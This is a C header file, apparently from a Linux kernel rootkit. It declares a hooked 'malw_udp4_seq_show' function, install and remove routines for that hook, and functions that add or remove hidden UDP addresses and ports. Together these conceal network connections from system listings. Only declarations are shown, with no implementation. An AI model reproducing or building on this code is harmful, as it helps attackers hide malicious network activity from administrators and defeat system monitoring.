#ifndef UDP_SEQ_SHOW_H
#define UDP_SEQ_SHOW_H

#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/udp.h>

asmlinkage long malw_udp4_seq_show(struct seq_file *, void *);
void install_udp_seq_show_hook(void);
void remove_udp_seq_show_hook(void);

void add_hidden_udp_ip(char *);
void remove_hidden_udp_ip(char *);

void add_hidden_udp_port(int);
void remove_hidden_udp_port(int);

#endif
